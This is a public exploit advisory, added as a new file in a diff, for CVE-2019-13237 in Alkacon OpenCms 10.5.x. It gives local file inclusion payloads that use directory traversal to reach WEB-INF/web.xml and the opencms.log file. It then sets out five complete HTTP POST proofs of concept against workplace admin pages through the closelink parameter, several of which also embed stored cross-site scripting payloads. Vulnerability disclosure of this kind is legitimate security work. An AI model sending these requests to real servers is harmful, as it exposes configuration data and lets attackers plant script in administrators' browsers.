@@ -1,0 +1,56 @@
+# Exploit Title: Alkacon OpenCMS 10.5.x - Multiple LFI in Alkacon OpenCms
+Site Management
+# Google Dork: N/A
+# Date: 18/07/2019
+# Exploit Author: Aetsu
+# Vendor Homepage: http://www.opencms.org
+# Software Link: https://github.com/alkacon/opencms-core
+# Version: 10.5.x
+# Tested on: 10.5.5 / 10.5.4
+# CVE : CVE-2019-13237
+
+For the tests, I used the payloads:
+```
+…%2f…%2fWEB-INF%2flogs%2fopencms.log
+…%2f…%2fWEB-INF%2fweb.xml
+```
+
+1. Affected resource closelink:
+POC:
+```
+POST /system/workplace/admin/workplace/loginmessage.jsp HTTP/1.1
+Host: example.com
+enabled.0=true&enabled.0.value=true&message.0=%3Cimg+src%3D.+onerror%3Dalert%281%29%3E%0D%0A&loginForbidden.0.value=false&timeStart.0=1%2F3%2F2000+12%3A00+AM&ok=Ok&elementname=undefined&path=%252Fworkplace%252Floginmessage&elementindex=0&action=save&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&page=page1&framename=
+```
+2. Affected resource closelink:
+POC:
+```
+POST /system/workplace/admin/contenttools/reports/xmlcontentrepair.jsp
+HTTP/1.1
+Host: example.com
+reporttype=extended&reportcontinuekey=&thread=dcbb6737-661b-11e9-a9fc-0242ac11002b&threadhasnext=false&action=reportend&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&ok=Ok
+```
+3. Affected resource closelink:
+POC:
+```
+POST /system/workplace/admin/accounts/group_new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Name%27%29%3E&description.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Description%27%29%3E&assignedOu.0=root+organizational+unit+%28%2F%29&enabled.0=true&enabled.0.value=true&ok=Ok&oufqn=&elementname=undefined&path=%252Faccounts%252Forgunit%252Fgroups%252Fnew&elementindex=0&action=save&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&page=page1&framename=
+```
+4. Affected resource closelink:
+POC:
+```
+POST /system/workplace/admin/history/settings/index.jsp HTTP/1.1
+Host: example.com
+versions.0=10&mode.0=2&ok=OK&elementname=undefined&path=%252Fhistory%252Fsettings&elementindex=0&action=save&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&page=page1&framename=
+```
+5. Affected resource closelink:
+POC:
+```
+POST /system/workplace/admin/history/reports/clearhistory.jsp HTTP/1.1
+Host: example.com
+reporttype=extended&reportcontinuekey=&thread=ac0bbd5f-66cd-11e9-ae09-0242ac11002b&classname=org.opencms.workplace.tools.history.CmsHistoryClearDialog&threadhasnext=false&action=reportend&closelink=..%2f..%2fWEB-INF%2fweb.xml&style=new&ok=OK
+```
+
+
+Extended POCs: https://aetsu.github.io/OpenCms
